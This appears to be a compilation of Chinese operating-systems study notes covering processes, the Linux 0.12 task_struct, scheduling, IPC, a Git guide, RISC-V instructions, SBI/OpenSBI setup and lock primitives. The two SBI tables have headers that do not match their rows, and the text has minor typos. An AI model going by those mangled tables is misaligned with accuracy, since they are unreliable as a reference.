<p><img src="Basic/OS/../images/1610293423278.png" alt="" />
非常重要的一张图</p>
<p>（单核）一次有一个程序在running，有一个Ready Queue的进程随时准备Running，有很多不同原因的Waiting Queue的进程在等待完成之后进入Ready Queue。一个新创建的进程进入Ready Queue，一个运行的进程调用exit终止。</p>
<h2 id="进程-1"><a class="header" href="#进程-1">进程</a></h2>
<p>进程是</p>
<p>Process = Code+Runtime Stack+Data+Heap+Program Counter+Registers。同时Process的metadata存储在<strong>PCB(Process Control Block)<strong>中，在Linux里这个结构叫</strong>task_struct</strong>。</p>
<p>Activation records：一个Function能正常的运行需要的信息包括<strong>返回地址、传入的参数、临时本地变量、返回值</strong>，以及寄存器的保存。</p>
<h3 id="pcb"><a class="header" href="#pcb">PCB</a></h3>
<p>我们来看PCB应该包括些什么，比如Linux0.12的task_struct：</p>
<pre><code class="language-c">struct task_struct {
	/* these are hardcoded - don't touch */
	// 下面这几个字段是硬编码字段
	long state;							// 任务的运行状态(-1 不可运行,0 可运行(就绪), &gt;0 已停止)
	long counter;						// 任务运行时间计数(递减)(滴答数),运行时间片
	long priority;						// 优先数.任务开始运行时counter=priority,越大运行越长
	long signal;						// 信号位图,每个比特位代表一种信号,信号值=位偏移值+1
	struct sigaction sigaction[32];		// 信号执行属性结构,对应信号将要执行的操作和标志信息
	long blocked;						// 进程信号屏蔽码(对应信号位图)

	/* various fields */
	int exit_code;						// 任务执行停止的退出码,其父进程会取.
	unsigned long start_code;			// 代码段地址
	unsigned long end_code;				// 代码长度(字节数)
	unsigned long end_data;				// 代码长度+数据长度(字节数)
	unsigned long brk;					// 总长度(字节数)
	unsigned long start_stack;			// 堆栈段地址
	long pid;							// 进程标识号(进程号)
	long pgrp;							// 进程组号
	long session;						// 会话号
	long leader;						// 会话首领
	int	groups[NGROUPS];				// 进程所属组号.一个进程可属于多个组
	/*
	 * pointers to parent process, youngest child, younger sibling,
	 * older sibling, respectively.  (p-&gt;father can be replaced with
	 * p-&gt;p_pptr-&gt;pid)
	 */
	struct task_struct *p_pptr;			// 指向父进程的指针
	struct task_struct *p_cptr;			// 指向最新子进程的指针
	struct task_struct *p_ysptr;		// 指向比自己后创建的相邻进程的指针
	struct task_struct *p_osptr;		// 指向比自己早创建的相邻进程的指针
	unsigned short uid;					// 用户标识号(用户id)
	unsigned short euid;				// 有效用户id
	unsigned short suid;				// 保存的用户id
	unsigned short gid;					// 组标识号(级id)
	unsigned short egid;				// 有效级id
	unsigned short sgid;				// 保存的组id
	unsigned long timeout;				// 内核定时超时值
	unsigned long alarm;				// 报警定时值(滴答数)
	long utime;							// 用户态运行时间(滴答数)
	long stime;							// 系统态运行时间(滴答数)
	long cutime;						// 子进程用户态运行时间
	long cstime;						// 子进程系统态运行时间
	long start_time;					// 进程开始运行时刻.
	struct rlimit rlim[RLIM_NLIMITS];	// 进程资源使用统计数组.
	/* per process flags, defined below */
	unsigned int flags;					// 各进程的标志
	unsigned short used_math;			// 标志:是否使用了协处理器.
	
	/* file system info */
	/* -1 if no tty, so it must be signed */
	int tty;							// 进程使用tty终端的子设备号.-1表示没有使用
	unsigned short umask;				// 文件创建属性屏蔽位
	struct m_inode * pwd;				// 当前工作目录i节点结构指针
	struct m_inode * root;				// 根目录i节点结构指针
	struct m_inode * executable;		// 执行文件i节点结构指针
	struct m_inode * library;			// 被加载库文件i节点结构指针
	unsigned long close_on_exec;		// 执行时关闭文件句柄位图标志.(include/fcntl.h)
	struct file * filp[NR_OPEN];		// 文件结构指针表,最多32项.表项号即是文件描述符的值
	/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */
	struct desc_struct ldt[3];			// 局部描述符表, 0 - 空,1 - 代码段cs,2 - 数据和堆栈段ds&amp;ss
	/* tss for this task */
	struct tss_struct tss;				// 进程的任务状态段信息结构
};
</code></pre>
<h3 id="进程的创建-forkexec"><a class="header" href="#进程的创建-forkexec">进程的创建 Fork+Exec</a></h3>
<p>Fork：子进程会复制父进程的所有信息。当然这个“复制”是可以有很多不同的实现的。比如“Copy on write”写时复制。</p>
<p>Exec：让子进程执行新的任务。通常的Fork后面都会紧接着Exec。</p>
<h3 id="进程的终止"><a class="header" href="#进程的终止">进程的终止</a></h3>
<p>Wait：等待子进程的结束。因为如果父进程结束了而子进程没有结束那么子进程就变成<strong>孤儿Orphan</strong>了。孤儿的回收由 <code>init</code>进程完成，所以孤儿进程一般不会有什么危害。</p>
<p>在进程自己调用exit()系统调用后，系统会回收进程的资源，包括物理和虚拟内存、打开的文件、IO缓冲区等。但是释放的资源不包括PCB，因为在PCB中进程有terminate状态，也就是说进程表中它依然存在，我们称之为<strong>僵尸Zombie</strong>进程。PCB的释放在父进程调用wait的时候发生，调用wait之后PCB被释放。</p>
<p>一个小问题是，进程只有在running的时候才能被终止吗？比如我kill一个sleep的进程会发生什么？</p>
<p><a href="http://zyearn.com/blog/2015/03/22/what-happens-when-you-kill-a-process/">kill的时候发生了什么</a>？当进程每次被调度的时候，会先检查一遍没有被处理的信号，signal是同步处理而不是异步处理的。所以上面的表述没有问题。详细一点说，<strong>当内核把进程p从kernel mode切换到user mode的时候，他会检查进程p的没有被block的待处理信号集合（bitmap，<code>pending &amp; ~blocked</code>）。如果这个集合为空<code>==0</code>，那么我们将继续执行p的下一条指令；如果这个集合非空，那么我们将选择集合中的某个信号K并强制执行。</strong></p>
<p>我们可以看到上面的PCB里有<code>sigaction</code>这个数组，他存储的就是进程用的处理signal的程序的函数指针（还有别的一些信息），还有<code>block</code>这个bitmap存储屏蔽的信号。
我们是可以修改<strong>某些signal</strong>的处理函数的或者阻塞<strong>某些signal</strong>的，SIGKILL和SIGSTOP是不能修改不可阻塞的。</p>
<p>修改处理信号函数：<code>sighandler_t signal(int sugnum,sighandler_t handler);</code></p>
<p>阻塞信号：<code>int sigprocmask(int how,const sigset_t *set,sigset_t *oldset);</code></p>
<h2 id="进程间通信-ipc"><a class="header" href="#进程间通信-ipc">进程间通信 IPC</a></h2>
<p>进程之间是相互独立的，但是可能需要合作。所以需要在进程之间通信。</p>
<p><strong>Signal</strong>就是进程之间通信的办法。但是我们一共只有32个Signal，而且不能传输数据。</p>
<p><strong>Shared Memory</strong>：我们通过虚拟内存的概念可以把两个进程的某一块虚拟地址映射到同一块物理地址，当然具体的实现还要考虑数据冲突问题更复杂。但是这个是有风险的，我们要保证我们的读写操作是线程安全的。</p>
<p><strong>Message Passing</strong>：允许进程不必通过共享地址空间来实现通信和同步。有两个基本操作<code>send</code>和<code>recv</code>用来发送和接受Message。<!--Socket是不是也属于Message Passing --></p>
<p>根据同步可以分成：</p>
<ul>
<li>Blocking Send：发送进程阻塞，知道Message被接收。</li>
<li>Non-Blocking Send：进程发送消息后继续执行。</li>
<li>Blocking Recieve：接收进程阻塞，直到有消息可以用。</li>
<li>Non-Blocking Recieve：接收进程收到一个有效消息或空消息。</li>
</ul>
<p>我们还可以使用间接的或者直接的通信：</p>
<ul>
<li>Direct Communication：进程必须明确的指定Message的接收者或发送者。</li>
<li>Indirect Communication：通过**MailBox(Port)**发送和接收Message。这样若干个共享一个Mailbox的进程就可以通信了，具体的实现可以限制为两个或多个。</li>
</ul>
<p>缓存机制，通信交换的信息总是驻留在临时队列中，这个队列可以是：</p>
<ul>
<li>零容量：不能有任何消息处于等待状态。</li>
<li>有限容量：最多有n个消息驻留</li>
<li>无限容量：发送者永不阻塞。</li>
</ul>
<h2 id="调度算法重点"><a class="header" href="#调度算法重点">调度算法(重点)</a></h2>
<p>虽然说，我们经常说调度进程，但是实际上调度的是线程，她才是执行单元。</p>
<p>我们有两个衡量调度算法的标准</p>
<ul>
<li>Average waiting time：进程在Ready Queue的等待时间。</li>
<li>Average turn-around time：进程被创建的时间到进程完成的时间。
除此之外调度算法还应该要尽可能的</li>
<li>Minimize Response Time：让响应速度更快</li>
<li>Maximize Throughput：让CPU执行有用工作的比例更高</li>
<li>Maximize CPU Utilization：最大化CPU利用率</li>
</ul>
<h3 id="first-come-first-serve"><a class="header" href="#first-come-first-serve">First come first serve</a></h3>
<p>可以通过队列方便的实现。先到（准确的说先请求CPU）的进程先服务，直到该进程结束切换到下一个进程。
这是一个<strong>非抢占Non-preemptive</strong>算法，抢占指的是CPU能不能在进程还没有执行完成的时候把它suspend去执行别的进程。这是必要而复杂的。</p>
<h3 id="sjf-最短作业优先"><a class="header" href="#sjf-最短作业优先">SJF 最短作业优先</a></h3>
<p>这是最理想的CPU调度算法，但是因为需要预先知道进程的运行时间，所以是不可能真正实现的。
如果是抢占的实现，对于每次有新进程到来，我们都要重新调度上<strong>剩余时间最短的进程</strong>。
对于非抢占的实现，那么我们只用在每次进程执行完成的时候调度时间最短的进程就好了。</p>
<h3 id="priority-scheduling"><a class="header" href="#priority-scheduling">Priority Scheduling</a></h3>
<p>每个进程都有一个优先级和他关联。
同样的优先级调度也有抢占和非抢占的实现。
如果是抢占的实现，对于每次有新进程到来，我们都要重新调度上<strong>优先级最高的进程</strong>。
对于非抢占的实现，那么我们只用在每次进程执行完成的时候调度优先级的进程就好了。
优先级算法的一个问题是可能造成<strong>饥饿starvation</strong>，低优先级的进程被一直阻塞得不到执行。SJF也是优先级算法的一种，也是存在starvation的问题的。
一个解决办法是Aging，提高等待时间长的进程的优先级。</p>
<h3 id="round-robin"><a class="header" href="#round-robin">Round-Robin</a></h3>
<p>Round-Robin是一种为分时系统设计的调度算法。他一定是抢占的。
我们把一个较小的时间单元定义成一个<strong>time slice</strong>，将Ready进程建立一个FIFO队列。
我们每次从队列中调度第一个进程，在执行完它的time slice或者执行完成之后它被切换走放在队列的末尾，队列中的下一个进程被调度。
Round-Robin需要考虑的一个问题是time slice的大小。太小的话context switch的overhead太大，太大的话就变成了FIFC。</p>
<h3 id="multilevel-queue-scheduling"><a class="header" href="#multilevel-queue-scheduling">Multilevel Queue Scheduling</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-qa"><a class="header" href="#os-qa">OS-Q&amp;A</a></h1>
<p>参考链接：https://www.cnblogs.com/flora5/p/7152556.html
(未完待续，持续更新)</p>
<h3 id="需求一如何在本地创建一个仓库然后和远程联动"><a class="header" href="#需求一如何在本地创建一个仓库然后和远程联动">需求一：如何在本地创建一个仓库，然后和远程联动？</a></h3>
<ol>
<li>
<p>创建公钥：  <code>ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</code>
然后查看公钥：<code>cat ~/.ssh/id_rsa.pub </code>，复制其中的内容，添加到Github的SSH中，名字随意。
<img src="Basic/OS/../images/1608269366372.png" alt="" />
然后相当于添加了一个身份认证。在本地填上自己的email和name，就可以和远程仓库联动了。</p>
</li>
<li>
<p>创建文件夹，<code>git init</code></p>
</li>
<li>
<p>添加Origin远程仓库：<code> git remote add origin git@github.com:reticenceji/oslab.git</code>(注意不要添加Https开头的那个远程仓库的地址，选SSH的)。添加后，远程库的名字就是<code>origin</code>，这是Git默认的叫法，也可以改成别的，但是<code>origin</code>这个名字一看就知道是远程库。</p>
</li>
<li>
<p>如果远程仓库是空的，你需要初始化一下（也就是第一次上传时）<code>git push --set-upstream origin master</code></p>
</li>
</ol>
<ul>
<li>2,3,4是你自己创建库，如果是已经存在的库，直接git clone就好了。</li>
<li><code>git remote -v</code> 查看origin</li>
</ul>
<ol start="4">
<li>查看信息
<pre><code>git remote -v     #查看远程仓库信息
git config --global -l   #列出本地个人信息，建议把email和github设成一样
</code></pre>
</li>
</ol>
<h3 id="需求二上传下载的基本操作"><a class="header" href="#需求二上传下载的基本操作">需求二：上传、下载的基本操作</a></h3>
<ol>
<li>关于上传的基本操作</li>
</ol>
<pre><code class="language-shell">git status     #查看当前工作区的状态
git add filename1,filename2	#保存到暂存区stage
git add .	#保存全部文件到stage
git commit -m &quot;提交说明&quot;	#保存到repository，提交说明尽可能的详细。
git push -u origin master	#第一次提交到远程仓库
git push origin master	#之后提交到远程仓库
</code></pre>
<ol start="2">
<li>关于回退的基本操作</li>
</ol>
<pre><code class="language-shell">git log		#查看提交历史，以便确定要回退到哪个版本。
git reflog	#查看命令历史，以便确定要回到未来的哪个版本。
git reset --hard HEAD^	#返回到上一个版本
</code></pre>
<p>3 <code>git pull origin</code>从远程拉取最新版本。</p>
<h3 id="需求三本地代码和远程代码有冲突的时候pull失败push失败"><a class="header" href="#需求三本地代码和远程代码有冲突的时候pull失败push失败">需求三：本地代码和远程代码有冲突的时候，pull失败/push失败</a></h3>
<p>当本地代码和远程代码有冲突的时候，执行git pull操作的时候，会提示有冲突，然后直接终止本次pull。
以下pull失败为例子。我在本地和远程分别编辑了README导致了冲突。
<img src="Basic/OS/../images/1601820199395.png" alt="" />
以下push为例子。我在本地和远程分别编辑了README导致了冲突。
<img src="Basic/OS/../images/1601820828236.png" alt="" /></p>
<p>这个有问题高级的方式解决，但是比较繁琐。建议在别的地方备份一下，然后强制合并：</p>
<pre><code>   git fetch --all      #从远程下载最新的，而不尝试合并或rebase任何东西。
   git reset --hard origin/master   #将主分支重置为您刚刚获取的内容
</code></pre>
<p>然后你手动观察一下哪里不太一样，手动merge再push。</p>
<ul>
<li>这个问题最好避免。避免方法为在写之前先pull一下更新到最新版本，写完之后add-commit-push三连直接上传。其实pull所做的操作就是fetch+merge，push也是有merge；所以不要你在写的时候正好别人也在写同样的文件提交了，一般不会出问题。</li>
<li>强制pull(慎用)，加个<code>-f</code>选项</li>
<li>origin可以认为是指向某个repository的指针，master是branch名字（主分支）。origin/master就是那个远程repo的主分支。我们输入的<code>git push origin master</code>是<code>git push origin master:master</code>的简写实际上是把本地的master推送到远程的master</li>
</ul>
<h3 id="需求四不用命令行使用git"><a class="header" href="#需求四不用命令行使用git">需求四：不用命令行使用git</a></h3>
<p>建议使用VSCode.</p>
<ul>
<li>他会列出所有的Changes,点击Changes旁边的<code>+</code>号保存changes到stage，相当于add。</li>
<li>最上方的✔️是commit</li>
<li></li>
</ul>
<h3 id="需求五版本的推进"><a class="header" href="#需求五版本的推进">需求五：版本的推进</a></h3>
<p>使用git的tag功能
方法一：使用github
可以在github里添加tag
然后<code>git pull origin #不能 git pull origin master</code>，在本地就会有tag了。</p>
<p>方法二：使用git
创建一个标签：<code>git tag -a v1.0 -m &quot;lab1的最终版本&quot;</code><br />
列出所有的标签：<code>git tag</code></p>
<p>然后如果你想返回到之前的版本：<code>git checkout v1.0</code>，然后你可以查看当时的成果。不过你想做出修改，也不会改到现在的版本。你先应该<code>git checkout master</code>回到当前的主分支，然后继续工作。</p>
<h3 id="需求六commit之后后悔了想要撤回"><a class="header" href="#需求六commit之后后悔了想要撤回">需求六：commit之后后悔了，想要撤回</a></h3>
<p>执行<code>git reset --soft HEAD^</code>，就是回到上一个版本。你的代码还在的。</p>
<h3 id="需求六想做一个小改动覆盖上一次的提交"><a class="header" href="#需求六想做一个小改动覆盖上一次的提交">需求六：想做一个小改动，覆盖上一次的提交</a></h3>
<p>本地覆盖记录
<code>git commit --amend -m &quot;xxxx&quot;</code>
线上覆盖提交，-f 表示强制push,远程的最新的一次commit被删除
<code>git push origin 分支名称:分支名称 -f</code></p>
<h3 id="需求七查看版本之间的区别"><a class="header" href="#需求七查看版本之间的区别">需求七：查看版本之间的区别</a></h3>
<p><code>git diff</code>命令可以查看区别，主要使用如下：
<code>git diff</code>查看当前没有add的内容修改。(这个vscode可以直接显示)
<code>git diff --cached</code>查看已经add没有commit的修改。
<code>git diff 版本号1 版本号2</code>查看版本之间的区别，举个例子，比如我刚刚pull了一个版本，我想查看他和上一个版本的区别，可以用<code>git diff HEAD^ HEAD</code>。</p>
<h3 id="需求八创建开发分支"><a class="header" href="#需求八创建开发分支">需求八：创建开发分支</a></h3>
<p><code>git branch name</code>可以创建分支，比如创建<code>develop</code>分支。
创建完之后，用<code>git checkout name</code>切换分支。
之后我们的commit操作就会提交到我们当前的这个分支上了。</p>
<p>之后，当我们做了一定的工作然后想要合并回主分支的时候，用<code>merge</code>或者<code>rebase</code>。merge是最简单的，永远不要rebase那些已经推送到公共仓库的更新。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-riscv学习笔记"><a class="header" href="#os-riscv学习笔记">OS-RISCV学习笔记</a></h1>
<!-- vscode-markdown-toc -->
<ul>
<li>
<ol>
<li><a href="Basic/OS/RISCV%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html#Registers">Registers</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="Basic/OS/RISCV%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html#Instructions">Instructions</a></li>
</ol>
</li>
<li>
<ol start="3">
<li><a href="Basic/OS/RISCV%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html#TrapinRISCV">Trap in RISCV</a></li>
</ol>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<h2 id="1-registers"><a class="header" href="#1-registers">1. <a name='Registers'></a>Registers</a></h2>
<p><img src="Basic/OS/../images/1602941945927.png" alt="Register" /></p>
<h2 id="2-instructions"><a class="header" href="#2-instructions">2. <a name='Instructions'></a>Instructions</a></h2>
<p>参考中文手册的附录，这里只是随便列了几个提供一下查找的方向。</p>
<ul>
<li>csr( Control and State Register) series：
<ul>
<li>csrr rd, csr  <code>x[rd] = CSRs[csr]，读CSR寄存器</code></li>
<li>csrw csr,rd   <code>CSRs[csr]=x[rd]，写CSR寄存器</code></li>
</ul>
</li>
<li>b( Branch ) series：
<ul>
<li>beq rs1, rs2, offset  <code>if (rs1 == rs2) pc += sext(offset)</code></li>
<li>beqz rs1, offset        <code>if (rs1 == 0) pc += sext(offset)</code></li>
</ul>
</li>
<li>l( Load ) series：
<ul>
<li>la rd, symbol	 <code>x[rd] = &amp;symbol，加载位置</code></li>
<li>lb rd, offset(rs1)  <code>x[rd] = sext(M[x[rs1] + sext(offset)][7:0])，字节加载</code></li>
</ul>
</li>
<li>s( Store ) series：
<ul>
<li>sb rs2, offset(rs1)		<code>M[x[rs1] + sext(offset) = x[rs2][7: 0]</code></li>
</ul>
</li>
<li>j ( Jump )：
<ul>
<li>j offset  <code>pc += sext(offset) 无条件跳转</code></li>
<li>jal rd, offset    <code>x[rd] = pc+4; pc += sext(offset) 保存下一条指令的位置并无条件跳转</code></li>
<li>jr rs1    <code>pc = x[rs1]，寄存器跳转</code></li>
</ul>
</li>
</ul>
<h2 id="3-trap-in-riscv"><a class="header" href="#3-trap-in-riscv">3. <a name='TrapinRISCV'></a>Trap in RISCV</a></h2>
<p>参考《riscv-privileged》Chapter 3；中文手册第十章
<a href="https://naotu.baidu.com/file/3f263ff379065fbe84138f5ba36cdb04">思维导图</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-sbi"><a class="header" href="#os-sbi">OS-SBI</a></h1>
<p>官方文档的链接请阅读README:<a href="https://github.com/riscv/riscv-sbi-doc.git">https://github.com/riscv/riscv-sbi-doc.git</a>. 在这里,我把其中一些重要内容翻译成中文.</p>
<p>参考<a href="https://archive.fosdem.org/2019/schedule/event/riscvsbi/attachments/slides/3058/export/events/attachments/riscvsbi/slides/3058/FOSDEM_RISCV_SBI_Atish.pdf">PPT</a></p>
<h1 id="认识riscv-sbi"><a class="header" href="#认识riscv-sbi">认识RISCV SBI</a></h1>
<p>我们使用S Mode 使用 ECALL产生异常，让M mode处理异常，从而调用SBI接口；
就像我们在U Mode使用ECALL产生异常，让S Mode处理异常，从而调用系统调用一样。
<img src="Basic/OS/../images/1616826661985.jpg" alt="" /></p>
<h2 id="二进制规范"><a class="header" href="#二进制规范">二进制规范</a></h2>
<p>和Linux使用几乎相同的二进制规范，</p>
<ul>
<li>函数参数的传递通过寄存器<code>a0</code>-<code>a5</code></li>
<li>寄存器<code>a7</code>(or <code>t0</code> on RV32E-based systems) 保存 SBI EID，相当于调用号。<code>a6</code>保存SBI FID，这个相当于一个辅助信息来区别调用。</li>
<li>返回值通过寄存器<code>a0</code>和<code>a1</code>返回。同时error code也通过<code>a0</code>返回。</li>
</ul>
<p>| Error Type                | Value |
| : | :-- | : |
| sbi_get_sbi_spec_version | 0    | 0x10 |
| sbi_get_sbi_impl_id      | 1    | 0x10 |
| sbi_get_sbi_impl_version | 2    | 0x10 |
| sbi_probe_extension      | 3    | 0x10 |
| sbi_get_mvendorid        | 4    | 0x10 |
| sbi_get_marchid          | 5    | 0x10 |
| sbi_get_mimpid           | 6    | 0x10 |</p>
<p>我们常见的不同SBI的实现的Implementation ID。</p>
<p>| Implementation ID | Name                                  |
| : | :-- | :-- |
| sbi_set_timer              | 0    | 0x00      | 0x54494D45      |
| sbi_console_putchar        | 0    | 0x01      | N/A             |
| sbi_console_getchar        | 0    | 0x02      | N/A             |
| sbi_clear_ipi              | 0    | 0x03      | N/A             |
| sbi_send_ipi               | 0    | 0x04      | 0x735049        |
| sbi_remote_fence_i         | 0    | 0x05      | 0x52464E43      |
| sbi_remote_sfence_vma      | 0    | 0x06      | 0x52464E43      |
| sbi_remote_sfence_vma_asid | 0    | 0x07      | 0x52464E43      |
| sbi_shutdown               | 0    | 0x08      | 0x53525354      |
| <strong>RESERVED</strong>               |      | 0x09-0x0F |                 |</p>
<p>你可以看到这里还有Replacement EID，这是另一些扩展的接口。</p>
<h1 id="使用riscv-sbi"><a class="header" href="#使用riscv-sbi">使用RISCV SBI</a></h1>
<p><img src="Basic/OS/../images/1616916397962.jpg" alt="" /></p>
<h2 id="opensbi"><a class="header" href="#opensbi">OpenSBI</a></h2>
<ul>
<li><a href="https://github.com/riscv/opensbi">开源的RISCV SBI参考实现</a>，由社区驱动</li>
<li>Builds a static library that any M-mode boot loader can link</li>
<li>Source level documentation using Doxygen</li>
</ul>
<p>两个静态链接库：</p>
<ul>
<li>libsbi.a：
<ul>
<li>A static library that provides SBI implementation </li>
<li>Other M-mode boot loader may just link this for SBI functionality</li>
<li>Every future proposed SBI extension will be implemented</li>
</ul>
</li>
<li>libplatsbi.a：
<ul>
<li>A static library that provides reference platform implementation </li>
<li>Contains minimal platform drivers required for bringup </li>
<li>Links libsbi.a for sbi implementation </li>
<li>Platform vendors are welcome to add their platform support</li>
</ul>
</li>
</ul>
<h2 id="qemuopensbi"><a class="header" href="#qemuopensbi">Qemu+OpenSBI</a></h2>
<p>参考GIT仓库的文档</p>
<pre><code class="language-shell">#下载OpenSBI
git clone https://github.com/riscv/opensbi.git
#设置环境 
export CROSS_COMPILE=riscv64-unknown-linux-gnu- 
make PLATFORM=generic FW_PAYLOAD_PATH=../oslab/arch/riscv/boot/Image 
#qemu启动
qemu-system-riscv64 -M virt -m 256M -nographic\
	-bios build/platform/generic/firmware/fw_payload.elf\
    -S -s
</code></pre>
<p>生成的FIRMWARE：我们使用第一个。得到的<code>fw_payload.elf</code>就是我们完整的程序。</p>
<p>**FW_PAYLOAD: **在启动阶段直接包含二进制文件，跟随OpenSBI firmware执行。通常payload是一个Bootloader(比如u-boot)或者一个小kernel。</p>
<p>**FW_JUMP: **是仅处理下一个booting stage entry的地址的固件，例如bootloader或OS内核，而无需直接包含此下一阶段的二进制代码。也就是说，在上一个阶段就要把要启动的东西加载到内存中。</p>
<p>**FW_DYNAMIC: **可获取有关下一个booting stage（例如bootloader或OS）以及上一个引导阶段的runtime OpenSBI库选项的信息。也就是说上一个启动阶段要向OpenSBI提供信息。</p>
<p>查看一下我们获得的ELF：0x80200000是默认的我们的PAYLOAD的加载地址。在做好准备工作之后，OpenSBI会mret到0x80200000处。</p>
<pre><code>Disassembly of section .payload:

0000000080200000 &lt;payload_bin&gt;:
    80200000:   00000297                auipc   t0,0x0
    80200004:   02828293                addi    t0,t0,40 # 80200028 &lt;payload_bin+0x28&gt;
    80200008:   fbf0031b                addiw   t1,zero,-65
    8020000c:   01f31313                slli    t1,t1,0x1f
    80200010:   006282b3                add     t0,t0,t1
    80200014:   10529073                csrw    stvec,t0
    80200018:   191030ef                jal     ra,802039a8 &lt;payload_bin+0x39a8&gt;
    8020001c:   0e9010ef                jal     ra,80201904 &lt;payload_bin+0x1904&gt;
    80200020:   7f5010ef                jal     ra,80202014 &lt;payload_bin+0x2014&gt;
    80200024:   18051073                csrw    satp,a0
    80200028:   12000073                sfence.vma
    8020002c:   000402b7                lui     t0,0x40
    80200030:   1222829b                addiw   t0,t0,290
    80200034:   10029073                csrw    sstatus,t0
    80200038:   14201073                csrw    scause,zero
    8020003c:   00000297                auipc   t0,0x0
    80200040:   02028293                addi    t0,t0,32 # 8020005c &lt;payload_bin+0x5c&gt;
</code></pre>
<h3 id="板子maix-dock"><a class="header" href="#板子maix-dock">板子Maix Dock</a></h3>
<p>Linux 不需要装驱动，系统自带了，使用 <code>ls /dev/ttyUSB*</code> 即可看到设备号。</p>
<p>处理器采用Kendryte K210，是<a href="https://github.com/riscv/opensbi/blob/master/docs/platform/platform.md">opensbi所支持</a>的。</p>
<p>用<code>kflash</code>烧写。具体可以参考我的另一篇文章<a href="Basic/OS//post/zai-k210-yun-xing-luo-ji-cheng-xu">k210运行裸机程序</a></p>
<h2 id="rustsbiqemuk210"><a class="header" href="#rustsbiqemuk210">RustSBI+QEMU/K210</a></h2>
<p>RustSBI提供了QEMU和K210的两套。</p>
<p>下载或编译<code>rustsbi-k210.bin</code>和<code>rustsbi-qemu.bin</code>。然后把他剪切一下。</p>
<p>k210跳转到0x80020000的地方，而程序被加载到0x80000000。所以我们需要把我们的kernel剪切到文件的0x20000处。qemu跳转到0x80200000的地方。Image和bin都是纯二进制文件，用<code>objcopy --strip-all</code>对ELF进行裁剪产生。下面是一个demo</p>
<pre><code class="language-makefile">K210_BOOTLOADER_SIZE = 131072
QEMU_BOOTLOADER_SIZE = 2097152
KERNEL_BIN = ./boot/Image
K210_RUSTSBI_BIN = ./boot/rustsbi-k210.bin
QEMU_RUSTSBI_BIN = ./boot/rustsbi-qemu.bin
K210_FIRMWARE = ./boot/k210_firmware.bin

debug: all
	qemu-system-riscv64 -machine virt -nographic \
	-bios $(QEMU_RUSTSBI_BIN) \
	-device loader,file=$(KERNEL_BIN),addr=0x80200000 \
	-s -S
run: all
	qemu-system-riscv64 -machine virt -nographic \
	-bios $(QEMU_RUSTSBI_BIN) \
	-device loader,file=$(KERNEL_BIN),addr=0x80200000 
k210: all
	@cp $(K210_RUSTSBI_BIN) $(K210_FIRMWARE)
	@dd if=$(KERNEL_BIN) of=$(K210_FIRMWARE) bs=$(K210_BOOTLOADER_SIZE) seek=1
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-synchronization"><a class="header" href="#os-synchronization">OS-Synchronization</a></h1>
<hr />
<p>首先我们需要明确，我们需要解决的问题：Critical Section Problem，Critical section同时只能有一个进程访问，否则<strong>可能</strong>会得到错误的结果。</p>
<p>如果禁用中断，可以避免kernel的critical section问题。但是这显然不好。</p>
<p>然后明确怎么样算解决了这个问题，我们的算法要满足三个条件：</p>
<ol>
<li>Mutual Exclusion：互斥。</li>
<li>Progress：总有一个进程在执行。</li>
<li>Bounded waiting：不会有一个一直无法得到执行的进程。</li>
</ol>
<h2 id="petersons-solution"><a class="header" href="#petersons-solution">Peterson’s Solution</a></h2>
<p>这个方法适用于两个进程交错执行Critical Section和Remainder Section，并假设语句是原子的。</p>
<pre><code class="language-c">int turn;	//下一个执行哪个进程
boolean flag[2];	//flag[i]==true表示Pi已经准备要执行了
while (true) {
	flag[i] = true;
	turn = j;
    //意思是，如果另一个进程没有准备好，或者现在轮到我执行了，我就执行
	while (flag[j] &amp;&amp; turn == j);
		/* critical section */
    //我不准备执行了
	flag[i] = false;
		/*remainder section */
}
</code></pre>
<p>分析他是一个 <strong>solution to the critical-section problem</strong>，不严谨的分析。</p>
<ol>
<li><strong>Mutual exclusion</strong>：显然，如果<code>flag[i]==false</code>，那么他要么是执行过了，要么还没准备要执行；如果<code>flag[i]==true and flag[j]==true</code>，那么turn将决定执行谁。（我们假设这里的每条句子是原子的）最后turn是谁就执行谁。</li>
<li>**Progress：**我们注意到Pi不执行的情况当且仅当<code>flag[j] &amp;&amp; turn == j</code>，Pj不执行的情况当且仅当<code>flag[i] &amp;&amp; turn == i</code>，他们不会同时满足，总有一个成立。</li>
<li>**Bounded waiting：**因为就两个进程，每个进程Pi执行完成后设置<code>flag[i]=false</code>，此时另一个等待的进程满足执行条件。</li>
</ol>
<h2 id="低级的原子语句"><a class="header" href="#低级的原子语句">低级的原子语句</a></h2>
<p>这是解决Critical Section算法的基础。</p>
<h3 id="test_and_set-instruction"><a class="header" href="#test_and_set-instruction">test_and_set Instruction</a></h3>
<p>假设硬件实现了对test_and_set的原子实现。下面是<strong>伪代码</strong>：</p>
<pre><code class="language-c">boolean test_and_set(boolean *target) {
    boolean rv = *target;
    *target = true;
    return rv;
}//返回值是true表示被加lock了
</code></pre>
<p>一个利用test_and_set的小例子：</p>
<pre><code class="language-c">do {
    while (test and set(&amp;lock));
    	/* do nothing */
    	/* critical section */
    lock = false;
    	/* remainder section */
} while (true);
</code></pre>
<p><code>lock==true</code>表示占用了资源</p>
<ul>
<li>如果lock之前是true，那么说明资源被别的程序占用了，我们进不去。</li>
<li>如果lock之前是false，在test_and_set中，我们实现了lock=true和返回false的操作，我们开始了critical section并且加了锁，防止其他程序进入。</li>
</ul>
<h3 id="compare_and_swap"><a class="header" href="#compare_and_swap">compare_and_swap</a></h3>
<pre><code class="language-c">int compare_and_swap(int *value, int expected, int new value) {
	int temp = *value;
	if (*value == expected)
		*value = new_value;
	return temp;
}
</code></pre>
<p>一个利用compare_and_swap的小例子：</p>
<pre><code class="language-c">while (true) {
    while (compare and swap(&amp;lock, 0, 1) != 0)
        ; /* do nothing */
        /* critical section */
    lock = 0;
   		/* remainder section */
}
</code></pre>
